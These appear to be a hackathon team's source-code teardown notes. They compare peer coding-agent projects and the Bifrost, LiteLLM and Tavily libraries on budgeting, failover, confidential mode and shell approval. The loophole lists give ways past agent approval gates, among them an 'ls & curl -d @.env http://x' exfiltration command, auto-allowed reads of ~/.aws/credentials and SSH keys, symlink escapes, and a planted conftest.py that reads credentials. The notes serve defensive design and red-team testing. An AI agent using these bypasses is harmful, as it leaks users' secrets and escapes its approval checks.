# 06 · Source-code teardown: peers, Bifrost, LiteLLM, RouteLLM, Tavily (2026-11-10)

How this was done: every repo below was shallow-cloned on 2026-11-10 and its **source** read (not just the README). Line numbers refer to the commit shown. "Loophole" means a concrete gap we can demonstrate. "[verify]" means it was inferred from code but not executed.

License rule (from the brief): MIT/Apache/BSD may be reused with attribution. GPL/AGPL and **no-license** repos are learn-only (no license = all rights reserved).

---

## 0. TL;DR

1. **Every peer checks the budget *then* calls *then* records.** None reserves the budget atomically, so two sessions in parallel can both pass. Bifrost itself does the same: `CurrentUsage + baseline >= limit` with **no estimate of the incoming request**, and usage is booked **asynchronously** after the response. LiteLLM is the only codebase with a real **reserve → reconcile → release-on-cancel** design. Copy that idea (MIT).
2. **Gidorah's confidential mode is not wired to its local-only key.** The real client is always built with `vkCloud`, and the TUI's default alias `gidorah-auto` overrides the confidential alias. Confidential code reaches the cloud unless an optional Go plugin is loaded. Their docker-compose does not load it.
3. **StaleGuard's confidential mode fails open** when the policy file is missing. It is read only from `--repo` (no parent search), so running from a subfolder or after `git switch` to a branch without the file sends code to the cloud. Tavily stays on in confidential repos.
4. **Gidorah's shell classifier treats a lone `&` as an ordinary character.** On Windows (`cmd.exe`, where `&` chains commands), `ls & curl …` is auto-approved as "read-only" and also escapes the confidential network deny.
5. **Bifrost is fully OSS for what we need:** CEL routing rules (`plugins/routing/rules`, cel-go), Code Mode (`core/mcp/codemode`, Starlark), semantic cache with identity scoping, and `routing_info`. All Apache-2.0.
6. **Prompt caching through Bifrost works.** Anthropic `cache_control` passes through on the native route, and usage comes back as `prompt_tokens_details.cached_read_tokens` / `cached_write_tokens`, plus OpenAI-style `cached_tokens` / `cache_write_tokens`. OpenAI `prompt_cache_key` also passes through. Evidence in §2.6.

---

## 1. Peer hackathon repos (same problem statement)

### 1.1 StaleGuard — github.com/Shrinu14/staleguard-agent @36dfab2 (5 Nov) — **NO LICENSE → learn only**

Python, ~3.2k LOC agent plus a Tavily "freshness" checker. One project covers two problem statements (PS01 + PS05).

| Requirement | How they do it (file:line) |
|---|---|
| Failover + notice | `"fallbacks"` sent in the body on the OpenAI-compat route. Reads the `x-bifrost-routing-info-{provider,model,is-fallback}` headers (`agent/llm.py:160-175`; names confirmed in Bifrost `transports/bifrost-http/lib/responseheaders.go:86-93`). Banner text: "Switched to X — Y unavailable". Client `max_retries=0` (`lookups.py:45`). **No resume across a full outage**: an `LLMError` ends the run (`loop.py:202`). |
| Budget | `BudgetGuard.check()` (`policy.py:231-251`): tiktoken `o200k_base` prompt count + a **fixed 1024 completion tokens**, priced at the most expensive model in the chain. Refuses unpriced cloud models. The SQLite ledger lives in `~/.staleguard`. Second layer is the Bifrost VK budget (402). Warns at 80%. At the limit it offers to continue locally (`cli.py:~460`). |
| Confidential | `.agent.toml confidential=true` → local-only plan + `BIFROST_VK_LOCAL` + client-side refusal of any non-`ollama/` id (`llm.py:134-140`). A malformed file counts as confidential. |
| Approval | Write tools return a `PendingAction`. `ConsoleApprover` checks `isatty`, defaults to No, and shows a diff. The edit is re-checked before apply (TOCTOU guard, `tools.py:239-242`). git subcommands are allowlisted. |
| Tokens | ast repo map, output truncation, compaction, planner/editor routing, stable prefix. |
| Benchmark | 12 home-made tasks × 6 cumulative modes × **1 run**, local qwen 7B. Success 8–50%. Tokens are nearly flat (2,460 → 2,625). |

**Loopholes**
- **L1 Budget race / overshoot.** `check()` reads `SUM(cost)` and `record()` writes after the call (`policy.py:231, 253`). There is no reservation, so N parallel sessions all pass. The main call sends **no `max_tokens`** (`loop.py:196-199`), but the estimate assumes 1024 output tokens, so any longer reply overshoots. tiktoken undercounts Claude by about 15-20% on text and more on code (Anthropic token-counting guide). Cache-write premium (1.25×) is ignored.
- **L2 Per-user identity is self-asserted.** `STALEGUARD_USER` env var or the OS login (`config.py:55, 79`). Changing the variable gives a fresh budget. The Bifrost VK budget is **one key shared by everyone** (`bifrost/config.json` `budget-vk-default`, $2/month), so it is not per-user.
- **L3 Confidential fails open on a missing file.** `if not path.exists(): return RepoPolicy()` (`policy.py:68`). The file is read only at `--repo` (`Repo.root = Path(root).resolve()`, `tools.py:71`, no parent walk). Running from a subfolder, a branch switch, an approved `git restore`/`stash`/`switch` (all allowlisted), or an approved `rm` silently downgrades the next session to cloud. The edit guard compares only the exact repo-root path (`tools.py:202`).
- **L4 Tavily stays on in confidential repos.** `_make_checker` builds `TavilySearcher` whatever `plan.local_only` says (`cli.py:370-374`). Library and symbol names go out for every edit, and `verify` sends prose claims (it prints a notice). Tavily calls also bypass Bifrost, the budget and the ledger.
- **L5 Approval.** `run_command` runs with `shell=True` and the full env (`tools.py:264`). There is no classification, so every command costs a prompt (approval fatigue). Approving `pytest` runs any planted `conftest.py`. No undo for shell side effects.
- **L6 Weak benchmark.** n=12, 1 seed, 7B local model, success 8–50%, so the token deltas are within noise. Their own README admits it.

### 1.2 Gidorah — github.com/piyushdotcomm/gidorah @2aa505f (5 Nov) — **Apache-2.0 (reuse OK with NOTICE)**

TypeScript monorepo, about 5.8k LOC: policy, bifrost, tavily, core, TUI, plus a Go DLP plugin for Bifrost.

| Requirement | How (file:line) |
|---|---|
| Failover | Parses routing headers including `x-bifrost-fallback-index` (`packages/bifrost/src/client.ts:55-74`). Per-phase cascade aliases via CEL routing rules (`config/bifrost/routing-rules.example.json`). |
| Budget | `BudgetService` is **in memory**. `precheck()` is `usedUsd >= limitUsd` (`runtime.ts:90-91`), so there is no per-call estimate. Hard-coded `new BudgetService(0.5, …)` per process (`apps/cli/src/main.ts:597, 653`). The real per-user cap is the Bifrost VK budget. |
| Confidential | Classifier: policy file in `~/.gidorah` with path globs, git remotes and a marker, realpath-canonicalised (`packages/policy/src/classify.ts`). Research is denied and network shell is denied. |
| Approval | A real shell lexer (`packages/policy/src/shell.ts`), a read-only allowlist, `$()`/backticks force a prompt, git alias/`-c` force a prompt. |
| Audit | SHA-256 hash-chained JSONL with an anchor file (`packages/core/src/session.ts`). |
| Benchmark | 12 Node tasks × 4 arms × 1 run on Fireworks DeepSeek/GLM. **48/48 solved (100%)**, a ceiling effect, so success cannot separate the arms. Only cost differs. |

**Loopholes**
- **G1 (critical) Confidential traffic uses the cloud key.** Real mode: `createBifrostClient({ virtualKey: config.bifrost.vkCloud })` (`main.ts:613`). `vkLocal` is loaded (`shared/src/config.ts:46`) but never used to build a client. The alias precedence is `deps.modelAliasByPhase ?? deps.modelAlias ?? env ?? (confidential ? "gidorah-local" : "gidorah-auto")` (`runtime.ts:197`), and the TUI always passes `modelAlias` (`main.ts:692` → `apps/tui/src/app.ts:414`), so confidential repos request `gidorah-auto` (cloud). The only remaining guard is the optional `plugins/bifrost-dlp` Go plugin, which is **not loaded in `docker-compose.yml`**. Go `.so` plugins also do not work on Windows.
- **G2 The DLP plugin checks only `body.model`.** It ignores the `fallbacks` in the body and rewrites by routing rules that run later. Their own global rule `budget_used > 85 → deepseek-flash` (`routing-rules.example.json:8`, scope `global`, priority 5) would re-route an `ollama/` request to the cloud after the plugin has already approved it [verify the hook order in a live gateway].
- **G3 Shell `&` bypass.** The tokenizer splits on `;`, newline, `&&`, `||` and `|`, but a single `&` becomes part of a token (`shell.ts:145-165`). `ls & curl -d @.env http://x` → segment `["ls","&","curl",…]` → command `ls` → **auto-allowed read-only** and `network=false`, so it also escapes the confidential deny. Bash runs with `shell:true` (`core/src/tools.ts:387`). On Windows `&` is cmd's command separator.
- **G4 Read-only shell is not path-confined.** `cat ~/.aws/credentials`, `cat C:\Users\…\.ssh\id_rsa` and `cat .env` are auto-allowed. PROTECTED_PATTERNS (`approval.ts:42`) apply only to read/write tools with a `path` argument, never to shell. `.env` is not on that list at all. `git diff/log --output=<file>` is a **write** that is auto-allowed as git_read.
- **G5 Symlink escape for tools.** `isInsideRoot` uses `path.resolve`, not `realpath` (`approval.ts:44-48`), so a committed symlink `docs -> ~` passes the root check (the CVE-2025-59829 class).
- **G6 Network detection is a denylist** (`curl/wget/ssh/…`, `shell.ts:45`). `python -c "urllib…"`, `node -e fetch(…)`, `powershell iwr` and `git remote add`+`push` all get "ask", not deny, in confidential mode.
- **G7 Budget overshoot by design.** `>=` on spend already booked, so the call that crosses the limit always goes through. Spend is in memory, so a restart resets it. Cached tokens are hard-coded to 0 (`client.ts:82`), so cost is overstated and the cache-hit % is the Bifrost semantic cache, not provider caching.
- **G8 Bifrost exposed on all interfaces** (`ports: "8080:8080"`, `docker-compose.yml:7`), using `bifrost:latest` unpinned. The hash chain is unkeyed: anything that can write `~/.gidorah` can rewrite the chain and the anchor.

### 1.3 Pinch — github.com/walker-null-byte/pinch (8 Nov) — **AGPL-3.0 → learn only. The strongest peer.**

Python. Offline `pinch prove`, 11 switchable techniques, and a **benchmark against mini-swe-agent in containers** with real OSS bugs (boltons, toolz, more-itertools, parse, humanize). This is the peer most likely to beat us on rigour.

- **Good ideas:** lazy tool loading (3 meta-tools, 264 tok vs 3.2k), `filememory` (re-read returns "unchanged since step N" or a diff), `stopongreen` (stop without another model call on a red→green test transition), `pretest` appended *after* the cached prefix, Bifrost cache namespaced by session id. Budget: `chars/3` + `max_tokens` as the output estimate, with live VK usage read from the Bifrost admin API, taking the max of gateway and own spend (`src/pinch/budget.py:42-77`). Confidential marker searched in **parent** folders, protected from tools, restored if changed (`policy.py`). The "always" approval is scoped to the exact shell command.
- **Loopholes:**
  - **P1** Still check-then-call with no reservation. Parallel sessions race, and Bifrost usage arrives "a moment after the call".
  - **P2** `.env` is loaded into `os.environ` (`config.py:104`), including **Bifrost admin Basic-auth credentials**, both VK values and `TAVILY_API_KEY`. Subprocesses inherit the full env (`vendor/coding_mcp_server.py:171`, no `env=`), so an approved `pytest` running a planted `conftest.py` can call the admin API to raise its own budget or add cloud providers to the local VK.
  - **P3** `chars/3` undercounts on Claude Opus ≥4.7 (that tokenizer produces up to 1.35× more tokens) and on dense code.
  - **P4** Code Mode is deliberately avoided, so there are no "tokens avoided" via sandboxed scripts.

### 1.4 Others (thin)

| Repo | License | Notes / loopholes |
|---|---|---|
| **LeanCoder** (pakmultilinks-dot/bifrost-leancoder) | none | Per-task **token** budget checked *after* the response (`leancoder/budget.py:51-56`, `add()` raises after the spend). Approval via `input()` on stdin, so piped input approves. Local 3B, 5 tasks, 1 run: lean 3,344 vs direct 3,810 tokens, 4/5 each. |
| **thrift-agent** (nemo-MV33) | none | Confidential is a **`--private` CLI flag per run**, so forgetting it sends code to the cloud. The freshness step sends the task text and dependency list to `groq/gpt-oss-20b` and calls Tavily with `search_depth:"advanced"` (2 credits). Budget = Bifrost VK only (post-hoc). |
| **TokenWise** (ashutosh9151) | none | In-memory `CostTracker`. Budget editable from the Streamlit UI. `str.startswith` workspace check (sibling-dir escape: `workspace2`). No confidential enforcement in code. |
| **pi-hofund** (f1yn) | — | Bifrost control-plane extension for the Pi agent. Not a competitor agent. |

---

## 2. Bifrost (maximhq/bifrost @3544722, 10 Nov) — **Apache-2.0**

### 2.1 Budget check vs deduction → overshoot confirmed
- Pre-check `LocalGovernanceStore.CheckBudget` (`plugins/governance/store.go:2248-2283`): `if budget.CurrentUsage+baseline >= effectiveMaxLimit → DecisionBudgetExceeded` → HTTP 402 `ErrorTypePolicyBudgetExceeded` (`main.go:991`). **The incoming request's cost is never estimated.**
- Deduction happens after the response: `PostLLMHook` → `p.tracker.UpdateUsage(p.ctx, usageUpdate)`, **queued asynchronously** (`main.go:1915, 2207`) → `BumpBudgetUsage` (CAS loop, `store.go:605`).
- Two extra permissive edges:
  - An expired-but-unswept budget is **skipped**, not denied, for up to one ticker interval (`store.go:2263-2266`, comment).
  - Closed PR #9238 ("token approximations for cancelled requests") shows that cancelled streams were previously unbilled [verify on the pinned version].
- **Overshoot bound** = cost of the request that crosses + all concurrent in-flight requests + the async lag. So use the VK budget as the backstop only.

### 2.2 Fallback loop and `routing_info`
- `handleRequest` (`core/bifrost.go:6067`) → `shouldTryFallbacks` (`:5858`): never on cancel, never when `AllowFallbacks=false` (plugin short-circuits), and **inferred** fallbacks are skipped when the primary refused as a caller fault.
- The loop (`:6199-6260`) re-runs `tryRequest` per fallback and sets `SetFallbackRoutingInfo`.
- `RoutingInfo{Provider, Model, Key, IsFallback, PrimaryProvider, PrimaryModel, RequestedProvider, RequestedModel, ServerSideFallbackModel}` (`core/schemas/bifrost.go:2134+`). The same data is in the `x-bifrost-routing-info-*` headers (`responseheaders.go:86-93`), so **both routes expose it** (this resolves RESEARCH.md §2's "[unverified]").
- **Confidentiality trap:** for an **unprefixed** model, `modelcatalogresolver` adds *inferred* cross-provider fallbacks for every catalog provider serving that name (`plugins/modelcatalogresolver/main.go:100-112`), and governance LB promotes the other VK providers to fallbacks (`plugins/governance/main.go:628-652`).
  - **Our rule:** always send fully prefixed `ollama/<model>`, `fallbacks: []`, and the local-only VK (the provider whitelist is the per-attempt guard).

### 2.3 Semantic cache keying
- Caching engages only with `x-bf-cache-key` (or a configured `default_cache_key`) (`plugins/semanticcache/main.go:519-535`).
- Identity (VK id / user id) is folded into `params_hash` unless `DisableIdentityScoping` is set (`main.go:537-580`).
- Filters: `cache_key`, `params_hash`, and optionally `provider`/`model` (`search.go:80-90`).
- **Leak risk:** in semantic mode the plugin calls an **embedding provider**, possibly a cloud one, on the prompt text. In confidential mode: never send `x-bf-cache-key`, make sure there is no `default_cache_key`, or use direct-only mode (`dimension:1`, no provider) (`main.go:24-28, 316`).

### 2.4 Routing rules (CEL): OSS
`plugins/routing/rules/engine.go` imports `github.com/google/cel-go/cel`. There are scopes (virtual_key/team/customer/global), priority, chain depth 10, and fallbacks per rule. There is also a complexity router (`plugins/routing/complexity*`, embedding/LLM classifier). All of it is in the Apache repo, and **no enterprise gating was found** in the code [verify the UI/config-store path].

### 2.5 MCP Code Mode: OSS
`core/mcp/codemode/` uses Starlark (`github.com/canonical/starlark` in `core/go.mod`) with 4 meta-tools. **Caveat (Pinch):** Code Mode executes tools *inside the gateway*, which bypasses a client-side approval gate. Use it only for read-only tools, or run our own sandbox instead.

### 2.6 Prompt caching passthrough (coordinator question) ✅
- **Anthropic `cache_control` reaches Anthropic** on native `/v1/chat/completions`:
  - per content block and per message (`core/schemas/chatcompletions.go:1230, 1387`)
  - per tool (`:456`) and on tool_use (`:1826`)
  - converted with `ChatBreakpointsAsCacheControl` (`core/providers/anthropic/chat.go:352`, clamped to 4 breakpoints)
  - top-level `Params.CacheControl` → `anthropicReq.CacheControl` (`chat.go:518-520`)
  - block-level copy (`chat.go:938, 965`)
- **Usage surfaced:**
  - Anthropic `cache_read_input_tokens` → `prompt_tokens_details.cached_read_tokens`, and `cache_creation_input_tokens` → `cached_write_tokens`, with 5m/1h split (`chat.go:1453-1463`).
  - ⚠ `prompt_tokens` **includes** cached reads and writes (`chat.go:1466`). Price as uncached = prompt − read − write.
  - Marshal also emits OpenAI-style `cached_tokens` and `cache_write_tokens` (`chatcompletions.go:2237-2248`), so the OpenAI SDK sees them.
- **`/anthropic/v1/messages` integration route** (`transports/bifrost-http/integrations/anthropic.go:119-124`): the response maps back to `cache_read_input_tokens` / `cache_creation_input_tokens` (`chat.go:1534-1541`).
- **OpenAI `prompt_cache_key`:** field in `ChatParameters` (`chatcompletions.go:230`), preserved for OpenAI (`providers/openai/chat.go:253-255`), and stripped only when the model's capability table says it is unsupported (`:310`).
- **Auto-inject breakpoints** is opt-in: per-provider `prompt_cache.auto_inject` or the `x-bf-prompt-cache-auto-inject` header (`transports/bifrost-http/lib/ctx.go:282, 742`, `core/providers/utils/promptcache.go`). Bifrost never invents breakpoints by default.
- **Our settings:**
  - Send explicit `cache_control` on the system prompt and tools.
  - Keep the stable prefix byte-identical.
  - Minimum cacheable prefix: 512 tokens on Opus 5.5/Sonnet 5.5/Haiku 5.5, 1024 on Sonnet 4.6, 4096 on Haiku 4.5.
  - Reads cost 0.1× (0.05× on Opus 5.5); writes cost 1.25× (5-minute TTL) or 2× (1-hour TTL).

---

## 3. LiteLLM (BerriAI/litellm @433163a) — **MIT outside `enterprise/`**

- **Budget reservation** (`litellm/proxy/spend_tracking/budget_reservation.py`):
  - `reserve_budget_for_request` (`:250`): counts input tokens, then `estimate_request_max_cost` takes the **max across deployments** (`:1416-1434`).
  - Output reserve = `min(requested max_tokens or 16384, model max_output_tokens)` (`:1686-1705`). This bounds both underestimates and DoS via `max_tokens=1e9`.
  - Atomic increment-then-check on a Redis/in-memory counter (`_reserve_reservable_counters`, `:992-1036`). Over budget → release that entry, then raise.
  - `reconcile_budget_reservation` (`:353`) after the call. `release_budget_reservation_on_cancel` (`:399`) **charges the input cost, not zero**. Lease renewal for long streams (`:136-175`).
  - **Loopholes:**
    - An unknown model returns `None`, which means **no reservation, read-time enforcement only** (`:300-304`).
    - `fail_closed_budget_enforcement=False` by default, so it fails open when the counter store is down.
- **Cooldowns** (`litellm/router_utils/cooldown_handlers.py:276-321`):
  - Cool down on 429, 401, 402, 408, 404 and every 5xx.
  - Never on other 4xx or on `APIConnectionError` strings.
  - Percent-failure threshold (`DEFAULT_FAILURE_THRESHOLD_PERCENT`, `:559`) and per-deployment `allowed_fails_policy`.
  - → borrow for our client-side circuit breaker: 429/5xx → cooldown the primary for T, keep probing.
- Known issue class (from the code comments): counters pinned high when cancelled streams are never reconciled → they added release-on-cancel. We must do the same: wrap in `try/finally` and reconcile to the input cost.

## 4. RouteLLM and cost/token estimation

- **RouteLLM** (lm-sys/RouteLLM, Apache-2.0, last push Aug 2024):
  - Routers: `mf`, `sw_ranking`, `bert`, `causal_llm`, trained on Chatbot Arena preference data. Calibrated threshold for the share of calls sent to the strong model. "85% cost cut at 95% GPT-4 quality on MT-Bench."
  - `mf`/`sw_ranking` need **OpenAI embeddings for every query**, which leaks the prompt (**unusable in confidential mode**) and costs money.
  - Trained on chat, not on agentic coding traces.
  - **Adopt:** only the *threshold-calibration* idea (pick the τ that gives X% strong calls on our own bench tasks). **Do not** route on prompt text (RESEARCH §8b). Use trace signals: test failures, repeated tool errors, as in SWE-Router / Pinch `cascade`.
- **Token counting accuracy:**
  - tiktoken `o200k_base` undercounts Claude by about 15-20% on text and more on code (Anthropic token-counting guide).
  - The Opus ≥4.7 tokenizer uses up to 1.35× more tokens than older Claude models.
  - **Fix:** call `POST /v1/messages/count_tokens` (model-specific, rate-limited; free per Anthropic docs [verify current terms]) for Claude routes, cached per prefix hash. Otherwise use `ceil(chars/2.5)` as a conservative fallback. Then apply a **calibrated safety factor**: track the ratio actual `usage.prompt_tokens` ÷ estimate per model and reserve at its p95. Output reserve = the `max_tokens` we actually send (always send it).
- No good OSS "task cost predictor" exists. Models predict their own cost poorly (arXiv 2604.22750, cited in RESEARCH §8b). Our quote = Σ(reserved per step) with a range drawn from bench history.

## 5. Tavily (tavily-python MIT; tavily-mcp MIT)

- **SDK facts** (`tavily/tavily.py`):
  - `search_depth ∈ {basic, advanced, fast, ultra-fast}`. Advanced costs 2 credits.
  - Other options: `max_results`, `include_raw_content` (token bomb), `auto_parameters` (can silently upgrade depth), `include_usage` (returns credits), `timeout` capped at 120.
  - **Env-driven:** `TAVILY_API_KEY`, `TAVILY_HTTP(S)_PROXY`, `TAVILY_PROJECT` (`:48-87`). An attacker-set proxy env var (direnv/.envrc) would MITM the queries.
  - `**kwargs` are merged into the payload.
- **How peers use it:**

  | Peer | Depth / results | Query construction | Confidential handling |
  |---|---|---|---|
  | StaleGuard | basic, 5 | name-only, regex-whitelisted; `include_domains` | still on in confidential |
  | Gidorah | own client | error text sliced to 200 chars; credits/day cap, cache by query hash | off in confidential, but error text bypasses their DLP because Tavily is not behind Bifrost |
  | Pinch | basic, 3 results, 300-char snippets | code fences and key-like tokens stripped | off in confidential |
  | thrift | advanced (2 credits) | — | — |

- **Lean and safe usage (ours):**
  - Request shape: `search_depth="basic"`, `max_results=3`, `include_answer=False`, `include_raw_content=False`, `auto_parameters=False`, `include_usage=True`, `include_domains=<official docs>`, timeout 10.
  - Query = whitelisted identifiers only: library, version, symbol, error class.
  - Strip paths, string literals and anything matching a canary or secret regex.
  - Cache by `sha256(query)` with a 7-day TTL. Count credits in the ledger.
  - Ignore proxy env vars by passing `proxies={}`.
  - **Hard-disabled** in confidential mode, at the egress choke point and not only in the tool list.
  - Treat results as *untrusted* (taint label).
- **tavily-mcp:** exposes search/extract/map/crawl. Crawl and map are credit-expensive. Expose **search only**, behind our gate. Never through Bifrost Code Mode.

---

## 6. How we beat each peer

| Peer | Their weakness (evidence) | Our feature | Demo proof (≤20 s each) |
|---|---|---|---|
| StaleGuard | Check-then-record, no `max_tokens`, 1024-token assumption, tiktoken (`policy.py:231-251`, `loop.py:196`) | Atomic SQLite **reservation** (`BEGIN IMMEDIATE`; reserve = counted input × p95 calibration + sent `max_tokens`), reconcile, release-on-cancel at input cost | `make race`: 20 parallel calls against $0.01 → our overshoot $0.0000 (spend + reserved ≤ limit); a StaleGuard-style check-then-record overshoots |
| StaleGuard | Missing `.agent.toml` = cloud; no parent walk; Tavily on in confidential (`policy.py:68`, `cli.py:370`) | Confidentiality from a user-level registry (path + remote + repo-id hash) **and** a marker searched upward. A marker that disappears = **stay confidential** (sticky per repo id). Tavily blocked at the egress choke point | Delete the marker / `git switch` / run from a subdir → still local. `agent audit` shows 0 confidential bytes to the cloud and 0 Tavily calls (canary check) |
| StaleGuard | Per-user = env var; one shared VK budget (`config.py:79`, `bifrost/config.json`) | One Bifrost VK **per user** (created at setup), ledger keyed by the VK id, not an env var | Set `USER=bob` → same budget; show two users hitting separate 402s |
| Gidorah | Confidential sent on the cloud VK (`main.ts:613`, `runtime.ts:197`) | Two LLM clients built from policy before the task is read; the local client **cannot** hold the cloud VK (enforced in the constructor) + egress check of the VK on every request | Confidential repo + `--model cloud` + an injected "use GPT" → refused before send; the Bifrost log shows only `ollama` |
| Gidorah | `&` / `cat` / `git diff --output` bypasses (`shell.ts:145-165`, `approval.ts:42`) | Parser rejects any unquoted `& ; \| > < $( ) \`` and newlines. Read-only shell args are path-confined via realpath. `--output`/`-o` = write. Red-team suite built from public bypasses | `make redteam`: `ls & curl`, `cat ~/.aws/credentials`, `git diff --output=x`, symlink → all blocked or prompted; table versus the peer's classifier |
| Gidorah | Network = denylist; symlink resolve ≠ realpath | Confidential mode: shell runs with **network denied by default** (no proxy env, allowlisted commands only); `realpath` everywhere | `python -c urllib…` in confidential → denied |
| Gidorah | 100% pass on easy tasks, 1 run | Bench on harder tasks (SWE-bench-lite subset / Pinch-style real OSS bugs), ≥2 seeds, cost per *solved* task with confidence intervals | Bench table with CIs + ablation toggles |
| Pinch | No reservation; admin creds and VKs inherited by subprocesses (`config.py:104`, vendor `subprocess.run`) | Env scrub for every subprocess (allowlist env: PATH, HOME, LANG…). The agent never holds Bifrost admin creds. Budget source = our ledger + VK 402 | A planted `conftest.py` prints `os.environ` → no keys. Admin API unreachable from the agent |
| Pinch | chars/3 estimate; no Code Mode | `count_tokens` + calibrated factor; our own sandboxed code-mode (read-only API) + "tokens avoided" counter | Estimate-vs-actual drift chart (p95 error under 5%) |
| thrift / LeanCoder / TokenWise | Per-run `--private` flag; post-hoc token budget; stdin approval; UI-editable budget | Policy decided before the task, from files the agent cannot write; TTY-only approval | Pipe `yes \|` into the agent → writes still denied |
| Bifrost itself | Post-hoc async deduction (`store.go:2248`, `main.go:2207`); inferred cross-provider fallbacks for unprefixed models | Pre-call reservation in front of Bifrost; always prefixed model ids, explicit `fallbacks`, a local-only VK; client circuit breaker | Show the Bifrost log: confidential request with `fallbacks: []`, provider = ollama |

## 7. Best parts to adopt

| Component | Source | License | Copy or reimplement |
|---|---|---|---|
| Reserve → reconcile → release-on-cancel (charge input cost); output reserve = min(max_tokens, model ceiling) | LiteLLM `budget_reservation.py:250-430, 1686-1705` | MIT | **Reimplement** in ~80 lines of Python on SQLite (`BEGIN IMMEDIATE`). Cite LiteLLM in the README |
| Cooldown status-code table (429/401/402/408/404/5xx yes, other 4xx no) | LiteLLM `cooldown_handlers.py:276-321` | MIT | Reimplement (tiny) with attribution |
| `routing_info` / `x-bifrost-routing-info-*` parsing incl. `fallback-index` | Gidorah `packages/bifrost/src/client.ts:55-74` (TS); Bifrost schema | Apache-2.0 | Reimplement in Python (headers + `extra_fields.routing_info`) |
| Shell lexer structure (quote/escape state machine, dynamic detection) | Gidorah `shell.ts:49-168` | Apache-2.0 | **Port with attribution + fix**: lone `&`, `>&`, `<(`, `&>`, PowerShell `;`/backtick, `^`; path-confine args |
| Repo classification by path glob + git remote from a user-level policy, realpath-canonicalised | Gidorah `classify.ts` | Apache-2.0 | Port the idea and add sticky repo-id + upward marker walk |
| Bifrost DLP/confidential plugin skeleton (HTTPTransportPreHook short-circuit 403) | Gidorah `plugins/bifrost-dlp/main.go` | Apache-2.0 | Optional stretch. Must also check `fallbacks`, and plugins don't load on Windows |
| Semantic-cache direct-only mode + identity scoping; no `x-bf-cache-key` in confidential mode | Bifrost `plugins/semanticcache` | Apache-2.0 | Config only |
| Explicit `cache_control` + `cached_read/write_tokens` accounting | Bifrost `anthropic/chat.go` | Apache-2.0 | Use as is (config + client code) |
| Lazy tool schemas, file-memory diffs, stop-on-green, pretest after the cached prefix, per-session cache namespace | Pinch | **AGPL** | **Ideas only**, clean-room reimplementation, no code copied |
| Name-only Tavily query whitelist + official-domain restriction | StaleGuard `freshness/research.py` | **No license** | Idea only (common practice); write our own regex |
| Tavily lean params | tavily-python | MIT | Use the SDK with explicit params, `proxies={}` |
| Threshold calibration for strong-model share | RouteLLM | Apache-2.0 | Idea only; calibrate on trace signals, not prompt embeddings |

## 8. Concrete fixes for our build (delta to RESEARCH.md §2)
1. **Reservation SQL:** `BEGIN IMMEDIATE; SELECT spent+reserved FROM budget WHERE user=?; if +reserve>limit → ROLLBACK, refuse; else UPDATE reserved+=?; COMMIT`. After the call, `reserved-=r, spent+=actual`. In `finally` on error or cancel, reconcile to the input cost. Stale reservations expire via a lease timestamp.
2. **Estimate:** `count_tokens` (Claude) or tokenizer/1.0 for OpenAI. Multiply by a p95 calibration factor learned from `usage`. Always send `max_tokens`. Price cache writes at 1.25× or 2×. Refuse unpriced models (like LiteLLM's gap, but fail **closed**).
3. **Confidential:**
   - Sticky registry `~/.agent/confidential.json` (repo realpath + remote URL + first-commit hash) + upward marker walk.
   - Missing marker on a known repo means it stays confidential.
   - Local client only (no cloud VK in the process), prefixed `ollama/` ids, `fallbacks:[]`, no `x-bf-cache-key`, Tavily off at the egress layer, subprocess network off.
4. **Shell:**
   - Reject unquoted `&`, `;`, `|`, `>`, `<`, `$(`, backticks, newline, `^` (cmd) and PowerShell operators outright. No chaining at all; the model must issue separate calls.
   - Realpath-confine every path-like argument.
   - Treat `--output`, `-o`, `--ext-diff`, `-c`, `--pre`, `--exec` as writes.
   - Env allowlist for subprocesses.
5. **Bench:** harder tasks (Pinch-style real bugs or a SWE-bench-lite slice), ≥2 seeds, report cost per solved task with a 95% CI, versus mini-swe-agent with the same model and gateway.

## Sources (cloned 2026-11-10)
- github.com/Shrinu14/staleguard-agent @36dfab2 · github.com/piyushdotcomm/gidorah @2aa505f · github.com/walker-null-byte/pinch · github.com/pakmultilinks-dot/bifrost-leancoder · github.com/nemo-MV33/thrift-agent · github.com/ashutosh9151/TokenWise @159a943
- github.com/maximhq/bifrost @354472245 (Apache-2.0) · PR maximhq/bifrost#9238
- github.com/BerriAI/litellm @433163a (MIT except `enterprise/`)
- github.com/lm-sys/RouteLLM (Apache-2.0) · github.com/tavily-ai/tavily-python (MIT) · github.com/tavily-ai/tavily-mcp (MIT)
- Anthropic token-counting and prompt-caching guidance (claude-api skill, cached 2026-10-06)
